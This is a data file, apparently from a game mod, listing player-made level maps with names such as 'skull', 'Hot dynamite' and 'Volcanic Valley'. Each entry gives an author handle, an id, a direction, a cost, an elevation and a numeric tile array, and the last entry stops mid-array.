maps.push({name="skull",author="FLaN KS",id="#1650719640",direction="forward",cost=294,elevation=0,map=[12,2,2,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,12,12,0,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,12,12,12,12,0,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,12,12,12,12,0,0,0,0,0,12,12,12,12,12,12,0,0,0,0,0,12,100,12,12,0,0,0,0,0,12,12,12,12,12,12,0,0,0,0,0,12,12,12,0,0,0,0,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,12,12,0,0,0,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,12,12,0,0,0,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,0,0,0,0,0,12,12,12,0,0,0,0,0,0,12,12,12,12,12,12,12,0,0,0,0,12,100,12,12,0,0,0,0,0,12,12,12,12,12,12,12,0,0,0,0,12,12,12,12,0,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,12,12,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,2,2,12]});
maps.push({name="gfl",author="gfl",id="#1650720794",direction="right",cost=362,elevation=0,map=[2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,0,0,0,70,73,73,73,71,74,74,74,70,0,0,0,0,0,0,1,0,0,0,Vector(0,70,170),5,5,5,5,5,5,5,5,5,71,0,0,0,0,5,1,0,72,73,5,7,7,6,6,6,6,7,7,5,5,71,0,0,0,0,1,0,70,5,5,7,8,0,0,0,8,8,7,7,5,5,71,0,0,6,1,70,5,5,6,7,0,0,8,8,0,8,7,6,7,5,71,0,0,0,1,71,5,8,6,8,0,8,8,8,0,8,8,6,8,8,5,71,0,7,1,5,6,8,6,8,0,0,8,0,0,8,8,6,8,8,6,5,0,0,1,5,6,8,6,8,8,8,8,8,8,8,8,6,8,8,6,5,5,8,1,5,6,5,6,8,0,0,0,0,0,8,8,6,5,5,6,5,2,0,1,5,6,5,6,8,0,8,0,8,8,8,8,6,5,5,6,5,2,9,1,5,6,8,6,8,0,8,0,8,8,8,8,6,8,8,6,5,5,0,1,5,6,8,6,8,8,8,8,8,8,8,8,6,8,8,6,5,0,10,1,72,5,8,6,8,0,0,0,0,0,8,8,6,8,8,5,72,0,0,1,70,5,8,6,7,8,8,8,8,0,8,7,6,7,5,5,72,0,11,1,8,70,5,5,7,8,8,8,8,0,8,7,7,5,5,72,0,0,0,1,0,71,73,5,7,7,6,6,6,6,7,7,5,5,72,0,0,0,12,1,11,1,72,73,5,5,5,5,5,5,5,5,5,72,0,0,0,0,0,1,0,0,1,0,70,73,73,73,72,74,74,74,70,0,0,0,0,0,13,0,12,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Bomb",author="Bomberman",id="#1650721449",direction="forward",cost=180,elevation=10,map=[0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,23,23,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,23,23,5,5,23,23,5,5,5,0,0,0,0,0,0,5,5,5,5,23,5,5,5,5,5,5,23,5,5,5,0,0,0,0,6,5,0,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,7,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,8,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,9,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,10,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,76,32,76,0,76,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,100,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,76,0,0,0,76,0,0,0,0,0,7,7,7,0,0,0,0,0,0,0,0,0,76,76,0,76,0,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,2,2,0,0,0,0,0,0,0]});
maps.push({name="Hot dynamite",author="Bomberman",id="#1650723504",direction="forward",cost=342,elevation=6,map=[0,0,0,0,0,0,0,0,0,0,0,0,5,76,5,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,76,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,76,5,76,5,0,0,0,0,0,0,0,0,0,0,0,0,5,76,5,76,5,76,76,76,5,0,0,0,0,0,0,0,0,0,0,5,76,76,76,5,76,76,76,5,76,5,0,0,0,0,0,0,0,0,5,76,76,76,5,76,5,76,5,76,76,76,5,0,0,0,0,0,0,5,76,76,76,5,76,76,76,5,76,76,76,5,0,0,0,0,0,0,5,76,76,76,5,76,76,76,5,76,5,76,5,0,0,0,0,0,0,5,76,5,76,5,76,76,76,5,76,76,76,5,0,0,0,0,0,0,5,76,76,76,5,76,76,76,5,76,76,76,5,0,0,0,0,0,0,5,76,76,76,5,76,5,76,5,76,76,76,5,0,0,0,0,0,0,0,0,5,76,5,76,76,76,5,76,76,76,5,0,0,0,0,0,0,0,0,0,0,5,76,76,76,5,76,5,76,5,0,0,0,0,0,0,0,0,0,0,0,6,5,76,5,76,76,76,5,0,0,0,0,0,0,0,0,0,0,0,0,7,6,5,76,76,76,5,0,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,5,76,5,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="god not flex againv1",author="Fara",id="#1650724254",direction="forward",cost=169,elevation=0,map=[0,0,0,0,0,14,14,14,2,2,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,24,91,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,91,24,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,91,24,24,91,24,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,91,24,24,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,24,91,24,24,91,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,24,24,91,24,24,24,91,24,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,2,2,14,14,14,0,0,0,0,0,0,0]});
maps.push({name="guess the map",author="Fara",id="#1650725572",direction="right",cost=204,elevation=13,map=[0,0,0,0,0,0,26,25,2,2,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,25,25,25,25,26,0,0,0,0,0,0,0,0,24,39,39,39,39,39,26,25,3,3,25,26,39,39,39,39,24,24,24,24,24,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,24,58,58,58,24,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,95,58,58,2,24,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,95,58,58,2,24,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,24,58,58,58,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="can you spot it",author="Fara",id="#1650726286",direction="left",cost=157,elevation=4,map=[0,0,97,39,0,0,0,0,0,0,0,39,97,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,0,0,0,0,0,39,0,0,0,0,0,39,0,0,0,0,0,0,33,33,0,0,0,0,0,0,0,0,39,0,0,0,0,0,0,0,0,34,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,34,34,34,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,36,35,34,34,0,0,0,0,17,18,17,17,18,18,18,18,18,17,18,17,36,35,35,0,0,0,0,0,18,65,18,17,18,65,18,18,17,18,65,18,36,36,0,0,0,0,0,0,17,18,17,17,18,65,18,18,18,17,18,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,37,37,37,0,0,0,0,0,0,37,37,37,37,37,37,37,37,96,100,1,37,37,37,0,0,0,0,0,0,2,36,36,36,36,36,36,37,1,1,1,37,37,37,0,0,0,0,0,0,2,36,36,36,36,36,36,37,37,37,37,37,37,0,0,0,0,0,0,0,37,37,37,37,37,37,37,37,37,37,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,37,0,0,0,0,0,0,0,0,0]});
maps.push({name="Defend baboons",author="Wolfdiman",id="#1650727571",direction="forward",cost=507,elevation=0,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,45,45,45,45,5,5,5,5,45,5,5,75,1,1,1,1,1,1,1,45,45,45,1,1,93,5,5,94,1,75,5,5,75,1,1,1,1,1,45,45,45,45,45,1,1,6,6,1,1,1,75,5,5,75,1,1,1,1,45,1,1,1,45,1,1,7,7,1,1,1,1,75,5,5,1,1,1,1,45,45,45,45,45,1,1,8,8,1,1,1,1,1,75,75,1,1,1,1,1,45,45,45,1,1,1,0,0,1,1,1,1,75,5,5,1,1,1,1,1,1,45,1,1,1,1,8,8,1,1,1,75,5,5,75,1,1,1,97,45,45,45,93,1,1,1,7,7,1,1,75,5,5,75,1,1,1,1,1,96,1,1,1,1,1,1,6,6,1,1,1,96,96,1,1,1,1,1,5,5,5,5,5,5,5,76,96,96,76,5,5,5,5,5,5,5,1,1,5,5,75,75,75,5,5,76,5,5,76,5,5,75,75,75,5,5,1,1,5,5,75,75,75,5,5,1,1,1,1,5,5,75,75,75,5,5,1,1,99,5,5,5,5,5,1,5,100,100,5,1,5,5,5,5,5,99,1,1,1,1,98,98,1,1,5,5,5,5,5,5,1,1,98,98,1,1,1,1,5,5,5,5,5,5,5,5,75,75,5,5,5,5,5,5,5,5,1,1,5,76,76,76,76,5,5,75,5,5,75,5,5,76,76,76,76,5,1,1,5,5,5,5,5,5,5,75,5,5,75,5,5,5,5,5,5,5,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1]});
maps.push({name="Not Mountain Escape",author="GandalfThePimp",id="#1650727764",direction="forward",cost=283,elevation=19,map=[0,2,2,1,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,19,19,19,20,21,22,23,24,24,24,0,5,5,5,5,5,5,5,5,5,19,19,19,20,21,22,23,24,24,24,0,5,5,5,5,5,5,5,5,5,19,19,19,20,21,22,23,24,24,24,0,5,5,5,5,5,5,5,90,5,19,19,19,20,21,22,23,24,24,24,0,5,5,5,5,5,5,5,5,5,19,19,19,0,0,0,0,24,24,24,0,6,6,6,5,5,90,5,5,5,18,18,18,0,0,0,0,24,24,24,0,7,7,7,5,5,5,5,5,5,17,17,17,0,0,0,0,24,24,24,0,8,8,8,5,5,5,5,90,5,16,16,16,0,0,0,0,24,24,24,0,9,9,9,5,5,5,5,5,1,15,15,15,0,0,0,0,24,24,24,0,9,9,9,10,11,12,13,14,1,14,14,14,0,0,0,1,1,95,1,0,9,9,9,10,11,12,13,14,95,14,14,14,0,0,0,0,24,24,85,0,9,9,9,10,11,12,13,14,95,14,14,14,0,0,0,0,24,24,24,0,9,9,9,10,11,12,13,14,1,14,14,14,0,0,0,0,24,24,24,0,92,0,92,0,0,0,0,0,1,0,0,0,0,0,0,0,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,0,0,0,0,0,0,0,19,19,19,85,19,19,24,24,24,0,0,0,0,0,0,0,0,0,0,0,100,19,88,19,19,19,4,24,24,0,10,10,10,0,0,0,0,0,0,0,19,19,19,85,19,19,24,24,24,0,93,10,94,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,24]});
maps.push({name="SKY FALL",author="MUHAMMETS7",id="#1650728371",direction="forward",cost=252,elevation=-14,map=[0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,2,2,10,0,0,0,0,0,0,0,0]});
maps.push({name="god not flex againv3",author="Fara",id="#1650728537",direction="forward",cost=258,elevation=5,map=[0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,3,3,3,3,10,10,10,10,0,0,0,0,0,0,0,0,10,66,66,10,10,10,10,10,10,66,66,10,0,0,0,0,0,0,0,0,10,66,66,10,10,10,10,10,10,66,66,10,0,0,0,0,0,0,0,0,14,69,69,14,14,14,14,14,14,69,69,14,0,0,0,0,0,0,0,0,14,69,69,14,14,14,14,14,14,69,69,14,0,0,0,0,0,0,0,0,14,69,69,69,69,69,69,69,69,69,69,14,0,0,0,0,0,0,0,0,14,69,69,69,69,69,69,69,69,69,69,14,0,0,0,0,0,0,0,0,14,14,14,10,10,69,69,10,10,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,69,69,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,69,69,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,66,66,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,66,66,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,91,91,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,91,91,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,2,2,10,0,0,0,0,0,0,0,0,0]});
maps.push({name="god not flex againv2",author="Fara",id="#1650729893",direction="forward",cost=280,elevation=5,map=[0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,15,15,15,15,15,5,5,5,5,5,5,15,15,15,15,15,0,0,0,0,15,15,15,15,15,15,92,92,92,92,15,15,15,15,15,15,0,0,0,0,15,92,92,92,15,15,15,15,15,15,15,15,92,92,92,15,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,21,18,15,12,9,7,7,7,7,7,7,9,12,15,18,21,0,0,0,0,0,0,0,0,7,75,75,7,7,75,75,7,0,0,0,0,0,0,0,0,0,0,0,0,7,75,75,7,75,75,75,7,0,0,0,0,0,0,0,0,0,0,0,0,7,75,75,7,75,75,75,7,0,0,0,0,0,0,0,0,0,0,0,0,7,75,75,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,75,75,7,7,0,0,0,0,0,0,0,0,0,0,0,0,7,75,75,75,75,75,75,7,0,0,0,0,0,0,0,0,0,0,0,0,7,75,75,75,75,75,75,7,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="2 way",author="nutwoomy",id="#1650730728",direction="forward",cost=231,elevation=10,map=[99,20,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,8,97,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,20,20,19,18,17,16,15,14,76,76,14,13,12,11,10,9,8,8,0,0,20,20,19,18,17,16,15,14,76,76,14,13,12,11,10,9,8,8,0,0,20,20,0,0,0,0,0,14,14,14,14,0,0,0,0,0,8,8,0,98,20,20,98,0,1,1,0,0,89,89,0,0,1,1,0,96,8,8,96,0,98,98,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,20,20,0,104,0,0,22,3,20,20,3,22,0,0,104,0,8,8,0,0,21,21,0,42,0,0,0,0,19,19,0,0,0,0,42,0,7,7,0,0,21,21,0,0,0,22,0,0,3,3,0,0,22,0,0,0,7,7,0,0,21,21,0,0,22,22,0,0,15,15,0,0,22,22,0,0,7,7,0,0,0,0,0,0,23,23,0,0,15,15,0,0,23,23,0,0,0,0,0,0,41,41,0,0,0,23,23,0,91,91,0,23,23,0,0,0,27,27,0,0,0,0,0,0,0,0,24,91,15,15,91,24,0,0,0,0,0,0,0,0,21,21,0,14,0,0,24,14,15,15,14,24,0,0,14,0,7,7,0,0,21,21,0,14,0,34,24,14,0,0,14,24,34,0,14,3,7,7,0,0,21,21,0,14,0,0,24,14,0,0,14,24,0,0,14,0,7,7,0,0,0,0,0,0,0,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,89,89,0,1,1,0,0,0,103,103,0,0,0,0,1,1,0,89,0,0,0,0,0,0,0,0,0,103,2,2,103,0,0,0,0,0,0,0,0]});
maps.push({name="MyHeart",author="FLaN KS",id="#1650731340",direction="forward",cost=340,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,12,76,76,76,12,0,0,0,0,0,0,0,0,0,12,0,0,0,0,12,76,76,76,76,76,12,0,0,0,0,0,0,0,0,12,0,0,0,12,76,76,76,76,76,76,76,12,0,0,0,0,0,0,0,12,0,0,0,12,76,76,76,76,76,76,76,76,12,0,0,0,0,0,0,12,0,0,0,12,76,76,76,76,76,76,76,76,76,12,0,0,0,0,0,12,0,0,0,0,12,76,76,76,76,76,76,76,76,76,12,0,0,0,0,12,12,12,12,12,12,76,76,76,76,76,76,76,76,76,76,12,12,0,0,0,0,0,0,0,12,76,76,76,76,76,76,76,76,76,12,0,12,0,0,0,0,0,0,12,76,76,76,76,76,76,76,76,76,12,0,0,12,0,0,0,0,0,0,12,76,76,76,76,76,76,76,76,12,0,0,0,12,0,0,0,0,0,0,12,76,76,76,76,76,76,76,12,0,0,0,0,12,0,0,0,0,0,0,0,12,76,76,76,76,76,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,76,76,76,12,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Volcanic Valley",author="wo0",id="#1650732382",direction="forward",cost=560,elevation=0,map=[1,1,1,1,1,1,21,5,2,2,5,21,1,1,1,1,1,1,1,1,1,1,1,1,1,1,21,5,5,5,5,21,1,1,1,1,1,1,1,1,1,1,1,1,1,21,17,5,5,6,5,21,1,1,1,1,1,1,1,1,1,1,1,1,1,21,5,5,5,5,5,17,21,1,1,1,1,1,1,1,1,1,1,1,1,21,5,5,6,5,5,17,21,1,1,1,1,1,1,1,1,1,1,1,1,21,91,91,5,5,91,91,21,1,1,1,1,1,1,1,1,1,1,1,1,21,5,5,91,91,6,5,21,1,1,1,1,1,1,1,76,76,1,1,1,5,5,5,5,5,5,5,21,21,1,1,1,1,1,76,76,76,76,76,76,76,76,26,26,5,5,5,5,5,1,1,76,76,76,76,76,76,76,76,76,76,76,26,26,76,76,26,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,26,76,76,76,26,76,76,76,76,76,76,76,76,76,76,76,76,1,5,26,26,76,76,76,26,26,76,76,76,76,76,76,76,76,76,1,1,1,5,5,5,5,5,5,5,26,76,76,76,76,76,76,76,76,1,1,1,1,21,5,5,5,5,5,5,5,5,1,1,1,76,76,76,1,1,1,1,1,21,5,6,5,5,6,5,17,1,1,1,1,1,1,1,1,1,1,1,1,21,5,5,5,5,5,5,21,1,1,1,1,1,1,1,1,1,1,1,1,21,5,5,5,5,6,5,21,1,1,1,1,1,1,1,1,1,1,1,1,21,17,17,17,95,17,17,21,1,1,1,1,1,1,1,1,1,1,1,1,1,21,5,5,5,5,21,1,1,1,1,1,1,1,1,1,1,1,1,1,1,21,5,2,2,5,21,1,1,1,1,1,1,1,1]});
maps.push({name="is this a bossfight",author="Fara",id="#1650733582",direction="forward",cost=188,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,6,6,16,16,16,0,0,0,0,0,0,0,0,0,0,0,16,16,6,6,6,6,6,6,16,16,0,0,0,0,0,0,0,0,0,16,16,6,6,6,6,6,6,6,6,16,16,0,0,0,0,0,0,0,16,16,6,6,6,0,26,26,0,6,6,6,16,16,0,0,0,0,0,16,16,6,6,6,0,0,26,26,0,0,6,6,6,16,16,0,0,0,0,16,6,6,6,0,0,26,26,26,26,0,0,6,6,6,16,0,0,0,0,16,6,6,0,0,26,26,0,0,26,26,0,0,6,6,16,0,0,0,0,16,6,6,26,26,26,0,0,0,0,26,26,26,6,6,16,0,0,0,0,16,6,6,26,26,26,0,0,0,0,26,26,26,6,6,16,0,0,0,0,16,6,6,0,0,26,26,0,0,26,26,0,0,6,6,16,0,0,0,0,16,6,6,6,0,0,26,26,26,26,0,0,6,6,6,16,0,0,0,0,16,16,6,6,6,0,0,26,26,0,0,6,6,6,16,16,0,0,0,0,0,16,16,6,6,6,0,26,26,0,6,6,6,16,16,0,0,0,0,0,0,0,16,16,6,6,6,6,6,6,6,6,16,16,0,0,0,0,0,0,0,0,0,16,16,6,6,6,6,6,6,16,16,0,0,0,0,0,0,0,0,0,0,0,16,16,16,95,95,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Temptation",author="lamp",id="#1650736357",direction="left",cost=156,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,2,34,34,0,0,77,77,77,77,77,77,77,77,77,77,0,0,34,34,0,2,34,34,0,77,91,29,29,91,29,29,91,29,29,91,77,0,34,34,0,0,34,34,0,0,77,77,77,77,77,77,77,77,77,77,0,0,34,34,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,34,34,0,0,0,0,0,0,0,96,0,0,0,0,0,0,34,34,0,0,34,34,34,34,34,34,34,34,96,34,34,34,34,34,34,34,34,34,0,0,34,34,34,34,34,34,34,34,96,34,34,34,34,34,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,96,0,97,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Criss Cross",author="tilgep",id="#1650736669",direction="forward",cost=184,elevation=-4,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,17,17,24,0,0,0,0,0,0,0,0,0,0,0,15,15,15,16,16,16,17,17,18,18,18,19,19,19,0,0,0,0,0,0,15,15,15,16,16,16,17,17,18,18,18,19,19,19,0,0,0,0,0,0,14,14,0,0,0,24,24,24,24,0,0,0,20,20,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,20,20,20,20,0,0,0,0,38,53,53,38,38,38,38,24,24,38,38,38,38,53,53,38,0,0,0,0,38,53,53,53,53,53,53,53,53,53,53,53,53,53,53,38,0,0,0,0,38,53,53,53,53,53,53,53,53,53,53,53,53,53,53,38,0,0,0,0,1,0,1,38,38,38,38,53,53,38,38,38,24,53,24,0